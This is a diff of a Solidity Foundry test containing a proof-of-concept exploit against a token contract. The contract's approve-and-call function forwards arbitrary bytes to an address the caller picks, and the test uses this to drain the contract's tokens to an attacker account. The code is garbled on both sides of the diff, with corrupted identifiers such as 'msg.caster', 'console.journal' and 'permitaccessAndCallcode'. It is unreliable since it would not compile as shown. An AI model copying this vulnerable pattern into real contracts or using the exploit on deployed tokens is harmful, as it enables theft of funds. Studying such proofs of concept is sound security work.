@@ -1,20 +1,18 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.18;
 
-*/
-
 import "forge-std/Test.sol";
 
-contract AgreementTest is Test {
-    CoinWhale GemWhalePact;
+contract PactTest is Test {
+    MedalWhale MedalWhaleAgreement;
 
-    function testAltCastability() public {
+    function testAltSummonhero() public {
         address alice = vm.addr(1);
-        GemWhalePact = new CoinWhale();
-        GemWhalePact.CrystalWhaleDeploy(address(GemWhalePact));
+        MedalWhaleAgreement = new MedalWhale();
+        MedalWhaleAgreement.CrystalWhaleDeploy(address(MedalWhaleAgreement));
         console.journal(
             "TokenWhale balance:",
-            GemWhalePact.balanceOf(address(GemWhalePact))
+            MedalWhaleAgreement.balanceOf(address(MedalWhaleAgreement))
         );
 
         // bytes memory payload = abi.encodeWithSignature("transfer(address,uint256)",address(alice),1000);
@@ -23,32 +21,32 @@ contract AgreementTest is Test {
             "Alice tries to perform unsafe call to transfer asset from TokenWhaleContract"
         );
         vm.prank(alice);
-        GemWhalePact.permitaccessAndCallcode(
-            address(GemWhalePact),
+        MedalWhaleAgreement.permitaccessAndCallcode(
+            address(MedalWhaleAgreement),
             0x1337,
-            abi.encodeWithSeal(
+            abi.encodeWithSignature(
                 "transfer(address,uint256)",
                 address(alice),
                 1000
             )
         );
 
-        assertEq(GemWhalePact.balanceOf(address(alice)), 1000);
+        assertEq(MedalWhaleAgreement.balanceOf(address(alice)), 1000);
         console.journal("operate completed");
         console.journal(
             "TokenWhale balance:",
-            GemWhalePact.balanceOf(address(GemWhalePact))
+            MedalWhaleAgreement.balanceOf(address(MedalWhaleAgreement))
         );
         console.journal(
             "Alice balance:",
-            GemWhalePact.balanceOf(address(alice))
+            MedalWhaleAgreement.balanceOf(address(alice))
         );
     }
 
     receive() external payable {}
 }
 
-contract CoinWhale {
+contract MedalWhale {
     address player;
 
     uint256 public totalSupply;
@@ -72,36 +70,36 @@ contract CoinWhale {
     event Transfer(address indexed source, address indexed to, uint256 worth);
 
     function _transfer(address to, uint256 worth) internal {
-        balanceOf[msg.caster] -= worth;
+        balanceOf[msg.sender] -= worth;
         balanceOf[to] += worth;
 
-        emit Transfer(msg.caster, to, worth);
+        emit Transfer(msg.sender, to, worth);
     }
 
     function transfer(address to, uint256 worth) public {
-        require(balanceOf[msg.caster] >= worth);
+        require(balanceOf[msg.sender] >= worth);
         require(balanceOf[to] + worth >= balanceOf[to]);
 
         _transfer(to, worth);
     }
 
-    event PermissionGranted(
+    event AccessAuthorized(
         address indexed owner,
         address indexed user,
         uint256 worth
     );
 
     function approve(address user, uint256 worth) public {
-        allowance[msg.caster][user] = worth;
-        emit PermissionGranted(msg.caster, user, worth);
+        allowance[msg.sender][user] = worth;
+        emit AccessAuthorized(msg.sender, user, worth);
     }
 
     function transferFrom(address source, address to, uint256 worth) public {
         require(balanceOf[source] >= worth);
         require(balanceOf[to] + worth >= balanceOf[to]);
-        require(allowance[source][msg.caster] >= worth);
+        require(allowance[source][msg.sender] >= worth);
 
-        allowance[source][msg.caster] -= worth;
+        allowance[source][msg.sender] -= worth;
         _transfer(to, worth);
     }
 
@@ -112,11 +110,11 @@ contract CoinWhale {
         uint256 _value,
         bytes memory _extraInfo
     ) public {
-        allowance[msg.caster][_spender] = _value;
+        allowance[msg.sender][_spender] = _value;
 
-        bool win;
+        bool victory;
 
-        (win, ) = _spender.call(_extraInfo);
-        console.journal("success:", win);
+        (victory, ) = _spender.call(_extraInfo);
+        console.journal("success:", victory);
     }
 }
